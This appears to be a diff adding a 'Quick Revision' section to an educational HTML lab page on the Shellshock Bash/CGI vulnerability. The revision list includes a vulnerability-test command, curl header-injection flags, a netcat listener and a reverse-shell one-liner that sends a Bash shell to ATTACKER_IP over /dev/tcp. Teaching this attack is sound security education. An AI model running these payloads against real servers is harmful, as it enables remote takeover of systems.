@@ -247,6 +247,24 @@
         <p class="body-text"><strong>The second trap is the reverse shell question.</strong> If Ajan asks why the reverse shell connects outward from the server rather than the attacker connecting inward — the answer is firewalls. Servers block unsolicited inbound connections. The reverse shell exploits the fact that outbound connections are usually allowed, tricking the server into initiating the call.</p>
       </div>
 
+      <!-- Section 10 — Quick Revision -->
+      <div class="section">
+        <span class="label label-concept">Quick Revision</span>
+        <h2 class="section-heading">Quick Revision</h2>
+        <ul class="revision-list">
+          <li><strong>Bash</strong> is the shell, which sits between the user and the OS kernel — the steering wheel between human and engine</li>
+          <li><strong>Shellshock's bug</strong> is in <code>parse_and_execute</code> — when Bash converts an environment variable back into a function, it doesn't stop reading at the closing } and executes everything after the semicolon</li>
+          <li><strong>Proof of vulnerability:</strong> if <code>env x='() { :; }; echo vulnerable' ./bash_shellshock -c "echo test"</code> prints vulnerable before test, the Bash is unpatched</li>
+          <li><strong>The attack bridge:</strong> HTTP headers → Apache passes them as environment variables to the CGI child Bash process → vulnerable Bash executes the payload</li>
+          <li><strong>curl flags:</strong> -A sets User-Agent, -e sets Referer, -H adds custom header — all three become environment variables in the CGI process</li>
+          <li><strong>echo Content-Type: text/plain</strong> followed by a blank line is required before any command output so Apache can format the HTTP response correctly</li>
+          <li><strong>Reverse shell</strong> = force the server to connect outward to the attacker's netcat listener, bypassing firewalls that block inbound connections</li>
+          <li><strong>nc -lv PORT</strong> on attacker machine → waits for the call</li>
+          <li><strong>/bin/bash -i > /dev/tcp/ATTACKER_IP/PORT 0<&1 2>&1</strong> → server starts a shell and pipes everything through a network connection to the attacker</li>
+          <li><strong>Both conditions required for remote exploitation:</strong> unpatched vulnerable Bash AND a CGI script on the web server</li>
+        </ul>
+      </div>
+
       <!-- Ready button -->
       <div class="btn-ready-wrap">
         <button class="btn btn-primary btn-ready" onclick="goToQuiz(window._quiz)">Ready to test yourself →</button>
